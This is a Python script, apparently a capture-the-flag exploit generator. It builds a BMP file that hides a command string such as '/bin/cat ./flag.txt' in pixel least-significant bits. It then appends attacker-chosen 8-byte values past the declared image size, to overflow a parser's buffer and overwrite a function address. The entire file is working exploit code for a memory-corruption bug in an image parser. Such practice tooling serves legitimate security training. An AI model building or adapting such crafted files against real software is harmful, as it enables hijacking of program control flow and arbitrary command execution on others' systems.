#!/usr/bin/env python3
import struct
import argparse

def bits_from_bytes(b: bytes):
    """Yield bits MSB-first for each byte."""
    for byte in b:
        for i in range(7, -1, -1):
            yield (byte >> i) & 1

def pack_overflow_values(values):
    """Parse comma-separated values into raw bytes (each as 8-byte little endian)."""
    out = b""
    for v in values:
        v = v.strip()
        if v.startswith("0x") or v.startswith("0X"):
            iv = int(v, 16)
        elif len(v) <= 8:
            iv = 0
            for c in v:
                iv = iv << 8
                iv += ord(c)
        else:
            raise(Exception(f"Unknown format: {v}"))
        out += struct.pack("<Q", iv & ((1<<64)-1))
    return out


def build_bmp(path: str, width:int, height:int, hidden_bytes: bytes, overflow_raw: bytes = b''):
    """
    Build BMP file to `path`:
    width, height - image dimensions used to compute nominal allocation (width*height*4)
    hidden_bytes - the C-string (bytes) to encode in LSBs (will be null-terminated)
    overflow_raw - arbitrary raw bytes to append after encoded pixels to reach biSizeImage
    """

    # BITMAPFILEHEADER (14 bytes)
    bfType = b'BM'
    # bfSize = file size (we compute later)
    bfReserved1 = 0
    bfReserved2 = 0
    bfOffBits = 54

    # BITMAPINFOHEADER (40 bytes)
    biSize = 40
    biWidth = width
    biHeight = height
    biPlanes = 1
    biBitCount = 32          # we must use 32-bit per specification
    biCompression = 0        # BI_RGB (no compression)
    biSizeImage = width * height * 4
    biXPelsPerMeter = 0
    biYPelsPerMeter = 0
    biClrUsed = 0
    biClrImportant = 0

    pixels = bytearray()
    bit_iter = bits_from_bytes(hidden_bytes)

    # Number of pixels to write = biSizeImage // 4 (the decompiled code uses >>2)
    pixel_count = biSizeImage // 4

    for _ in range(pixel_count):
        b0 = 0x00
        b1 = 0x00
        # next bit for b2 LSB if available, else 0
        try:
            bit = next(bit_iter)
        except StopIteration:
            bit = 0
        # choose b2 base value and set LSB
        b2 = (0x00 & ~1) | (bit & 1)
        b3 = 0x00
        pixels.extend([b0, b1, b2, b3])

    # If pixels length < biSizeImage, pad with zeros to reach exactly biSizeImage
    if len(pixels) < biSizeImage:
        pixels += b'\x00' * (biSizeImage - len(pixels))
    # If longer, truncate (shouldn't normally be the case)
    if len(pixels) > biSizeImage:
        pixels = pixels[:biSizeImage]

    # After encoding bits into the first pixel_count pixels, we append overflow raw bytes.
    if overflow_raw:
        pixels += overflow_raw # Overflow bytes -> will replace the address of "print_hidden_string"
        biSizeImage = len(pixels) # Update size to include every the overflow

    # Build headers
    bfSize = bfOffBits + len(pixels)
    file_header = struct.pack("<2sIHHI", bfType, bfSize, bfReserved1, bfReserved2, bfOffBits)
    info_header = struct.pack("<IIIHHIIIIII",
                              biSize, biWidth, biHeight, biPlanes, biBitCount,
                              biCompression, biSizeImage,
                              biXPelsPerMeter, biYPelsPerMeter, biClrUsed, biClrImportant)

    with open(path, "wb") as f:
        f.write(file_header)
        f.write(info_header)
        f.write(pixels)

    return biSizeImage

def main():
    p = argparse.ArgumentParser(description="BMP builder for LSB-hidden string + overflow bytes (32-bit BMP).")
    p.add_argument("out", help="output BMP filename")
    p.add_argument("--width", type=int, default=16, help="BMP width (pixels)")
    p.add_argument("--height", type=int, default=16, help="BMP height (pixels)")
    p.add_argument("--hidden", type=str, default="", help="Hidden C-string to encode (e.g. '/bin/cat ./flag.txt')")
    p.add_argument("--overflow", type=str, default="", help="Single or comma-separated list of 8-byte values (hex or chars) to append after pixel bytes")
    p.add_argument("--pad", type=int, default=0, help="Padding size before overflow data")
    args = p.parse_args()

    width = args.width
    height = args.height
    padding = b"A" * args.pad
    hidden_bytes = args.hidden.encode('latin-1')  # allow bytes in 0-255 range

    # build overflow bytes
    overflow_b = b''
    if args.overflow:
        parts = args.overflow.split(",")
        overflow_b += pack_overflow_values(parts)

    biSizeImage = build_bmp(args.out, width, height, hidden_bytes, padding+overflow_b)

    # Final check: warn if biSizeImage is small or large
    print(f"[+] Building BMP -> {args.out}")
    print(f"    width x height = {width} x {height}  (alloc size = {width*height*4} bytes)")
    print(f"    biSizeImage = {biSizeImage} bytes (declared)")
    print(f"    Hidden = Supposed to have {hidden_bytes} hidden with LSB")
    print(f"    Overflow = {padding + overflow_b}")

    print("[+] Done.")

if __name__ == "__main__":
    main()
